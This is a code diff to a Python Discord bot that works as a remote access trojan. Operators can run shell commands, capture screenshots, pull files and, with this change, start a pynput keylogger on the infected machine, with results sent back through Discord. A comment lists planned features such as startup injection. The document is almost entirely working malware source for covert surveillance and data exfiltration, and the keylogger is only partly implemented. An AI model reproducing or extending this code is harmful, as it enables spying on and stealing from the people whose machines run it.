@@ -1,8 +1,10 @@
 from discord.ext import commands
 from discord.ext.commands.errors import MissingRequiredArgument
+import threading
 import discord
 import subprocess
 import pyautogui
+import time
 import math
 import os
 
@@ -18,9 +20,9 @@ token = '<tokenhere>'
 # for keeping track of the directory configuraton files
 # keylogs : directory where keylogged strokes are to be stored
 config_dir = {
-	'keylogs' : 'C:\\Users\\name\\AppData\\Local\\Temp\\keylogs\\',							# where logs of keystrokes will be saved
-	'screenshots' : 'C:\\Users\\name\\AppData\\Local\\Temp\\screenshots',					# where screenshots will be stored
-	'hybrids' : ''																			# where command config will be placed
+	'keylogs' : '.',						# where logs of keystrokes will be saved
+	'screenshots' : '.',					# where screenshots will be stored
+	'hybrids' : '.'							# where command config will be placed
 }
 
 #####################################
@@ -40,6 +42,10 @@ def limiter(str_input, limit):
 
 	return output
 
+# whenever a key is pressed, do the ff.
+def on_key_press(key):
+	# look where to load the config files
+	print (key)
 
 #############################
 #    EVENTS DEFINED HERE    #
@@ -117,12 +123,16 @@ async def shell(ctx, *args):
 	description='Takes a screenshot from the user and sends file in the channel.\nThis uses pyautogui technology'
 )
 async def sshot(ctx):
+	if (config_dir['screenshots'] == '.'):
+		await ctx.send('[!] Cannot take screenshot, please assign config_dir')
+		return
+
 	# takes screenshot and save as 00000.png
 	sshot = pyautogui.screenshot()
-	sshot.save('00000.png')
+	sshot.save(config_dir['screenshots'] + '00000.png')
 
 	# sends this file to the server
-	await ctx.send(file=discord.File('00000.png'))
+	await ctx.send(file=discord.File(config_dir['screenshots'] + '00000.png'))
 
 
 
@@ -143,9 +153,43 @@ async def get_file(ctx, file_path):
 		await ctx.send(f'[CommandBot {nickname}] Usage : get_file <file path>')
 
 
+@bot.command(
+	brief='Starts Keylogger',
+	description='Command that starts the keylogger and saves the file on config directory.'
+)
+async def keylog(ctx, timeout : int):
+	from pynput.keyboard import Listener, Key
+
+	await ctx.send(f'[CommandBot {nickname}] Starting keylogger')
+	await ctx.send(f'[*] Text output will be saved at : {config_dir["keylogs"]}')
+	if (config_dir['keylogs'] == '.'):
+		await ctx.send('[~] Cannot start keylogger! Path to log is not assigned yet!')
+		return
+
+	# check if file already exists (create one if none)
+	if (not os.path.isfile(config_dir['keylogs'] + '\\logs.txt')):
+		open(config_dir['keylogs'] + '\\logs.txt', 'w').write(' ')
+
+	# start the keylogger on this part
+	with Listener(on_press=on_key_press) as listener:
+		def stop_listening(time_stop):
+			time.sleep(time_stop)
+			listener.stop()
+
+		# wait for n secs to stop the logging
+		th = threading.Thread(target=stop_listening, args=(timeout,))
+		th.start()
+
+		th = threading.Thread(target=listener.join)
+		th.start()
+
+	await ctx.send(f'[*] Started keylogger for {timeout} seconds.')
 
 
-@bot.command()
+@bot.command(
+	brief='configuration path reading',
+	description='command that assigns where the configuration files are being saved'
+)
 async def configlookup(ctx):
 	await ctx.send(f'[CommandBot {nickname}] Directory configuration list :')
 	await ctx.send(f"""```
@@ -155,6 +199,21 @@ keylogs			{config_dir['keylogs']}
 hybrids			{config_dir['hybrids']}
 screenshots		{config_dir['screenshots']}
 ============================================================```""")
+
+@bot.command(
+	brief='Starts Keylogger',
+	description='Command that starts the keylogger and saves the file on config directory.'
+)
+async def setconfig(ctx, key, value):
+	if (key in config_dir):
+		await ctx.send(f'[*] Assigning {key} : {value}')
+		if (os.path.isdir(value)):
+			config_dir[key] = value
+			await ctx.send('[+] Value assigned!')
+		else:
+			await ctx.send('[!] Cannot add path, path does not exist!')
+	else:
+		await ctx.send('[~] Cannot assign value on that one')
 
 
 # additional features : change directory, show config directories, inject startup
